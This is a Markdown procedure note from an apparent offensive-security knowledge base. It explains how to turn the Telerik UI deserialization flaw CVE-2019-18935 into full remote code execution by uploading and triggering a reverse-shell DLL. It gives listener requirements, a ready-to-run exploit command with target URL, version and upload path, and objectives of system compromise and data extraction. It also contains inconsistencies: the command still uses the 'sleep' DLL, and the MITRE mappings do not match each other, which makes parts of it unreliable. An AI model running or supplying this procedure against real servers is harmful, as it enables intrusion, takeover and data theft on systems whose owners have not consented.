---
id: proc-full-rce
tags:
  - reverse-shell
  - full-compromise
type: procedure
tools:
  - '[[tools/CVE-2019-18935.py]]'
tactics:
  - '[[Execution]]'
commands:
  - '[[commands/upload-and-trigger-specific-dll]]'
verified: false
platforms:
  - Web
  - Windows
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[PowerShell]]'
  - '[[Exploitation of Remote Services]]'
updated_at: '2025-12-14T17:23:36.000Z'
skill_level: advanced
impact_level: critical
detection_risk: high
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[PowerShell]]'
  - '[[Exploitation of Remote Services]]'
---
# Demonstrate-Full-RCE-with-Reverse-Shell-Payload

## Summary

This procedure extends the deserialization PoC to full RCE by compiling and uploading a reverse shell DLL, triggering it to establish a command shell on the compromised Windows server, leading to total system access.

## Description

Replacing the sleep gadget with a reverse shell implementation in the DLL (e.g., using System.Diagnostics.Process to connect back), the procedure uploads and triggers via the same handler, exploiting CVE-2019-18935 for outbound connection to the attacker's listener, bypassing typical web restrictions.

## Requirements

1. Listener setup (e.g., netcat on attacker machine)
2. Custom reverse shell DLL compiled
3. Vulnerable endpoint and version
4. Network path for shell callback

## Defense

Defensive measures and detection strategies:

- Disable outbound connections from web servers
- Use endpoint detection for anomalous processes
- Regularly patch and audit Telerik components

## Objectives

1. Achieve interactive shell access
2. Escalate to system compromise
3. Extract or manipulate server data

## Instructions

### Step 1: Upload and Trigger Reverse Shell DLL

**Context**: Use the script with a specific shell DLL to initiate the connection.

**Command** ([[commands/upload-and-trigger-specific-dll]]):

```bash
python3 CVE-2019-18935.py -u https://target/apps/XTRAHome/Telerik.Web.UI.WebResource.axd?type=rau -v 2016.2.607 -f 'C:\Windows\Temp' -p sleep_2020051106245038_amd64.dll
```

> Adapt DLL for shell; script uploads and triggers. Expected output: '[*] Local payload name: sleep_2020051106245038_amd64.dll ... {'fileInfo': {...}} ... [*] Response time: 11.47 seconds' followed by shell connection on listener.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]] Execution

### Techniques

- [[PowerShell]] PowerShell
- [[Exploitation of Remote Services]] Exploitation for Privilege Escalation

### Sub-Techniques


## Commands Used

- [[commands/upload-and-trigger-specific-dll]]

## Tools Used

- [[tools/CVE-2019-18935.py]]

## Tags

- reverse-shell
- full-compromise
